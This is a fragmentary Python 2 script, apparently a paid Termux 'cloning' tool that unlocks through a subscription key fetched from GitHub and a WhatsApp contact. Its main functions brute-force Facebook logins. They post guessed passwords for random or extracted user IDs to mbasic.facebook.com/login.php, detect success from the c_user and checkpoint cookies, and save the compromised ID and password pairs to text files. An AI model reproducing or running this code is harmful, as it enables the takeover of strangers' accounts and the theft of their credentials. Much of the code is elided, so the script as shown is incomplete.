...
#Original Script Written By SHARP-SHOOTER
#Don't Try To Decompile The Script Without My Permission
...
def main_apv():
    ...
    try:
        ...
        os.system('clear')
        print logo
        print '           You Do Not Have The Subscrption'
        print '           Hello Dear This Command Is Paid'
        print '           You Do Not Have The Subscription'
        print '           Talk With The Command Author'
        print '           For Subscription Press Enter'
        print '           Or Else Nock Me On Whatsapp'
        print ''
        ...
        print '           Copy The Key And Nock Me In Whatsapp'
        print ''
        print ''
        print ''
        print '     If You Have Taken The Subscriptions'
        raw_input('    Exit From Termux Then Run The Command Again ')
        os.system('xdg-open https://wa.me/+8801815596010')

    r1 = requests.get('https://raw.githubusercontent.com/SHARP-SHOOTER1/Mainserver/main/approved.txt').text
    if key1 in r1:
        main_system()
    else:
        os.system('clear')
        print logo
        print '           You Do Not Have Subscrption'
        print '           Hello Dear This Command Is Paid'
        print '           You Do Not Have The Subscription'
        print '           Talk With The Command Author'
        print '           For Subscription Press Enter'
...
def main_system():
    ...
    print 43 * '~'
    print '\x1b[1;92m[*]\x1b[1;95m For Any Kind Of Help Type 7 And \x1b[1;92mWhatsApp Me  '
    print 43 * '~'
    main_input()
...
def main_input():
    ...
    if mx == '1':
        ...
        print ''
        print ''
        print '\x1b[1;92m        Congratulations Bro You Are Paid User'
        print '\x1b[1;92m        Member Those Have Done Payment Can Use Paid '
        print '\x1b[1;91m        ENJOY THE COMMANDS '
        time.sleep(3.5)
        main_system()
    elif mx == '6':
...
def numcloning():
    ...
    print logo
    print ''
    print '    \x1b[1;91m\n[ Pakistani Random Number Cloning ]'
    print ''
    print '\x1b[1;92m\n   [*] Type First 4 Letter Of Any Network : '
    ...
    print 'IF ID DOES NOT COME USE (airplane) FLIGHT MOD'
    os.system('echo " ------------------------------------"| lolcat')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[Saimon-OK] ' + coc + user + ' | ' + pass1
                ok = open('Saimon-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'checkpoint' in rana.cookies.get_dict().keys():
                print '\x1b[1;91m[Saimon-CP] ' + coc + user + ' | ' + pass1
                cp = open('Saimon-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
    ...
    try:
        ...
        if pp == '1':
            ...
            try:
                ...
                print ''
                print ''
                print '\x1b[1;91m     Your Token Has Expire'
                time.sleep(3)
                os.system('rm -rf token.txt')
                main_system()
...
def mineExt():
    ...
    print g + '[=] Extracting From Saimon : ' + my_line[:15]
    ...
    def main(arg):
        ...
        try:
            ...
            if 'c_user' in rana.cookies.get_dict().keys():
                ...
                print '\x1b[1;91m[Saimon-CP] ' + uid + ' | ' + pass1
                cp = open('Saimon-cp.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
                ...
                if 'c_user' in rana.cookies.get_dict().keys():
                    print '\x1b[1;92m[Saimon-OK] ' + uid + ' | ' + pass2
                    ok = open('Saimon-ok.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'checkpoint' in rana.cookies.get_dict().keys():
                    print '\x1b[1;91m[Saimon-CP] ' + uid + ' | ' + pass2
                    cp = open('Saimon-cp.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        print '\x1b[1;92m[Saimon-OK] ' + uid + ' | ' + pass3
                        ok = open('Saimon-ok.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'checkpoint' in rana.cookies.get_dict().keys():
                        print '\x1b[1;91m[Saimon-CP] ' + uid + ' | ' + pass3
                        cp = open('Saimon-cp.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            print '\x1b[1;92m[Saimon-OK] ' + uid + ' | ' + pass4
                            ok = open('Saimon-ok.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'checkpoint' in rana.cookies.get_dict().keys():
                            print '\x1b[1;91m[Saimon-CP] ' + uid + ' | ' + pass4
                            cp = open('Saimon-cp.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                print '\x1b[1;92m[Saimon-OK] ' + uid + ' | ' + pass5
                                ok = open('Saimon-ok.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'checkpoint' in rana.cookies.get_dict().keys():
                                print '\x1b[1;91m[Saimon-CP] ' + uid + ' | ' + pass5
                                cp = open('Saimon-cp.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
...
def xokp():
    ...
    def main(arg):
        ...
        try:
            ...
            b = rana.post('https://mbasic.facebook.com/login.php', data={'email': uid, 'pass': pass1, 'login': 'submit'})
            if 'c_user' in rana.cookies.get_dict().keys():
                print '\x1b[1;92m[Saimon-OK] ' + uid + ' | ' + pass1
                ok = open('Saimon-ok.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
                    ...
                    if 'c_user' in rana.cookies.get_dict().keys():
                        ...
                        if 'c_user' in rana.cookies.get_dict().keys():
                            ...
                            if 'c_user' in rana.cookies.get_dict().keys():
                                ...
                                if 'c_user' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;92m[Saimon-OK] ' + uid + ' | ' + pass6
                                    ok = open('Saimon-ok.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'checkpoint' in rana.cookies.get_dict().keys():
                                    print '\x1b[1;91m[Saimon-CP] ' + uid + ' | ' + pass6
                                    cp = open('Saimon-cp.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
